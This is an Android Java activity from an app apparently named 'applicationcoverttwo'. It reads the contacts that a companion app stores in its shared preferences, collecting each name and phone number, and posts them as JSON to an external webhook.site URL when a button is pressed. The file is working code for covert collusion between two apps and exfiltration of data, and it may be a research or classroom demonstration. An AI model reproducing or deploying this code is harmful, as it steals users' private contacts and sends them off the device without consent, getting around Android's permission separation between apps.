package com.e.applicationcoverttwo;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button clickMeButton = findViewById(R.id.buttonClickMe);

        clickMeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                readFromFile();
            }
        });

    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void readFromFile() {

        try {
            Context con = createPackageContext("com.e.applicationcovertone", 0);//first app package name is "com.sharedpref1"
            SharedPreferences pref = con.getSharedPreferences(
                    "contacts", Context.MODE_PRIVATE);

            String quantity = pref.getString("contacts-quantity", "");
            System.out.println("quantity: " + quantity);
            List<UserModel> users = new ArrayList<UserModel>();

            for (int i = 1; i <= Integer.valueOf(quantity); i++) {
                users.add(new UserModel(pref.getString("contacts-" + i + "-name", ""), pref.getString("contacts-" + i + "-phoneNumber", "")));
            }

            post(users);

        } catch (PackageManager.NameNotFoundException ignored) {
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void post(List<UserModel> users) throws IOException {
        //https://webhook.site
        MediaType MEDIA_TYPE = MediaType.parse("application/json");
        String url = "https://webhook.site/9272d1bf-069f-48ef-bd39-e7d9af518d5b";

        OkHttpClient client = new OkHttpClient();

        JSONObject postdata = new JSONObject();
        try {
            for (int i = 0; i < users.size(); i++) {
                System.out.println(users.get(i).toString());
                postdata.put(String.valueOf(i), users.get(i).toString());
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

        RequestBody body = RequestBody.create(MEDIA_TYPE, postdata.toString());

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .header("Accept", "application/json")
                .header("Content-Type", "application/json")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                String mMessage = e.getMessage().toString();
                //call.cancel();
            }

            @Override
            public void onResponse(Response response) throws IOException {
                String mMessage = response.body().string();
            }
        });

    }

}
